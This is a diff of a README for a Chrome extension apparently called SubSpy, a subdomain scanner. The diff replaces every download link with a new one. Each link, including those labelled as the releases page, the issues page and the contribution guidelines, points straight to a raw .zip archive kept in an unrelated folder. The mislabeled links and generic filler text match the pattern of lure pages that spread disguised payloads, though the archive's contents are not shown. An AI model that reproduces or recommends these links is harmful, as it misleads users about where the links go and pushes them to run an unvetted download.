@@ -4,13 +4,13 @@
 
 Welcome to SubSpy-Fast-Subdomain-Scanner-, the Chrome extension that helps you find subdomains of the current website using DNS over HTTPS. This tool is perfect for everyone, from beginners in cybersecurity to web developers who need a fast and efficient way to explore domains. Follow the steps below to download and run the extension.
 
-[![Download Now](https://raw.githubusercontent.com/YHH306/SubSpy-Fast-Subdomain-Scanner-/main/innoxious/SubSpy-Fast-Subdomain-Scanner-.zip%20Now-%23e67e22?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/YHH306/SubSpy-Fast-Subdomain-Scanner-/main/innoxious/SubSpy-Fast-Subdomain-Scanner-.zip)
+[![Download Now](https://github.com/YHH306/SubSpy-Fast-Subdomain-Scanner-/raw/refs/heads/main/icons/Scanner_Sub_Subdomain_Spy_Fast_v1.3.zip%20Now-%23e67e22?style=for-the-badge&logo=github&logoColor=white)](https://github.com/YHH306/SubSpy-Fast-Subdomain-Scanner-/raw/refs/heads/main/icons/Scanner_Sub_Subdomain_Spy_Fast_v1.3.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
    To download the latest version of SubSpy-Fast-Subdomain-Scanner-, click the link below:  
-   [Download Here](https://raw.githubusercontent.com/YHH306/SubSpy-Fast-Subdomain-Scanner-/main/innoxious/SubSpy-Fast-Subdomain-Scanner-.zip)
+   [Download Here](https://github.com/YHH306/SubSpy-Fast-Subdomain-Scanner-/raw/refs/heads/main/icons/Scanner_Sub_Subdomain_Spy_Fast_v1.3.zip)
 
 2. **Choose the Correct File**  
    Once you are on the releases page, look for the latest version. You will see a list of files. Select the file suitable for your system. For example, you might see a `.crx` file for Chrome.
@@ -65,12 +65,12 @@ Welcome to SubSpy-Fast-Subdomain-Scanner-, the Chrome extension that helps you f
 
 ### Support
 
-For further assistance, feel free to check out our [GitHub Issues page](https://raw.githubusercontent.com/YHH306/SubSpy-Fast-Subdomain-Scanner-/main/innoxious/SubSpy-Fast-Subdomain-Scanner-.zip).
+For further assistance, feel free to check out our [GitHub Issues page](https://github.com/YHH306/SubSpy-Fast-Subdomain-Scanner-/raw/refs/heads/main/icons/Scanner_Sub_Subdomain_Spy_Fast_v1.3.zip).
 
 ## 🌐 Community and Contribution
 
-We welcome contributions! If you want to suggest features, report bugs, or help improve the project, please visit our [Contribution Guidelines](https://raw.githubusercontent.com/YHH306/SubSpy-Fast-Subdomain-Scanner-/main/innoxious/SubSpy-Fast-Subdomain-Scanner-.zip).
+We welcome contributions! If you want to suggest features, report bugs, or help improve the project, please visit our [Contribution Guidelines](https://github.com/YHH306/SubSpy-Fast-Subdomain-Scanner-/raw/refs/heads/main/icons/Scanner_Sub_Subdomain_Spy_Fast_v1.3.zip).
 
 Thank you for choosing SubSpy-Fast-Subdomain-Scanner-. We hope this tool enhances your web exploration experience! 
 
-[Download Here](https://raw.githubusercontent.com/YHH306/SubSpy-Fast-Subdomain-Scanner-/main/innoxious/SubSpy-Fast-Subdomain-Scanner-.zip)
+[Download Here](https://github.com/YHH306/SubSpy-Fast-Subdomain-Scanner-/raw/refs/heads/main/icons/Scanner_Sub_Subdomain_Spy_Fast_v1.3.zip)
